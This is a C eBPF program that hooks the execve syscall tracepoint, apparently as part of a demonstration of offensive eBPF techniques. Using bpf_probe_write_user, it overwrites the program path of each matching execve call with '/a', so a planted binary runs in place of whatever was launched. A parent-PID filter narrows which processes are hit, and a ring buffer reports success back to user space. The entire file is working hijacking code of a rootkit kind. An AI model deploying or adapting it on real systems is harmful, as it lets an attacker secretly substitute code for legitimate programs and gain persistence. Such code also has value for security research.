// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024 * 16);
} rb SEC(".maps");

struct event {
    u32 pid;
    u8 comm[TASK_COMM_LEN];
    bool success;
};
const struct event *unused __attribute__((unused));
// Optional Target Parent PID

const volatile int target_ppid = 0;
/*
cat /sys/kernel/tracing/events/syscalls/sys_enter_execve/format
        name: sys_enter_execve
        ID: 674
format:
field:unsigned short common_type;       offset:0;       size:2; signed:0;
field:unsigned char common_flags;       offset:2;       size:1; signed:0;
field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
field:int common_pid;   offset:4;       size:4; signed:1;

field:int __syscall_nr; offset:8;       size:4; signed:1;
field:const char * filename;    offset:16;      size:8; signed:0;
field:const char *const * argv; offset:24;      size:8; signed:0;
field:const char *const * envp; offset:32;      size:8; signed:0;

print fmt: "filename: 0x%08lx, argv: 0x%08lx, envp: 0x%08lx", ((unsigned long)(REC->filename)), ((unsigned long)(REC->argv)), ((unsigned long)(REC->envp))
*/

SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // Check if we're a process of interest
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *) bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (target_ppid != ppid) {
            return 0;
        }
    }

    // Read in program from first arg of execve
    char prog_name[TASK_COMM_LEN];
    char prog_name_orig[TASK_COMM_LEN];
    //__builtin_memset(prog_name, '\x00', TASK_COMM_LEN);
    char *p;
    //bpf_core_read(&p,sizeof(p),&ctx->args[0]);
    p = (char *)BPF_CORE_READ(ctx,args[0]);
    long ret;
    ret = bpf_probe_read_user_str(prog_name, sizeof(prog_name) , p);
    if (ret < 0) {
        bpf_printk("bpf_probe_read_user_str error,%d", ret);
    }
    ret = bpf_probe_read_user_str(prog_name_orig, sizeof(prog_name), p);
    if (ret < 0) {
        bpf_printk("bpf_probe_read_user_str error,%d", ret);
    }
/*    long ret;
    ret = bpf_probe_read_user_str(prog_name, sizeof(prog_name), (void*)ctx->args[0]);
    if (ret < 0) {
        bpf_printk("bpf_probe_read_user_str error,%d", ret);
    }
    ret = bpf_probe_read_user_str(prog_name_orig, sizeof(prog_name_orig), (void*)ctx->args[0]);
    if (ret < 0) {
        bpf_printk("bpf_probe_read_user_str error,%d", ret);
    }*/
    bpf_printk("[EXECVE_HIJACK] %s\n", prog_name);

    // Program can't be less than out two-char name
    if (prog_name[1] == '\x00') {
        bpf_printk("[EXECVE_HIJACK] program name too small\n");
        return 0;
    }

    // Attempt to overwrite with hijacked binary path
    prog_name[0] = '/';
    prog_name[1] = 'a';
    for (int i = 2; i < TASK_COMM_LEN; i++) {
        prog_name[i] = '\x00';
    }
    ret = bpf_probe_write_user((void *) ctx->args[0], &prog_name, 3);

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        for (int i = 0; i < TASK_COMM_LEN; i++) {
            e->comm[i] = prog_name_orig[i];
        }
        bpf_ringbuf_submit(e, 0);
    }

    return 0;
}
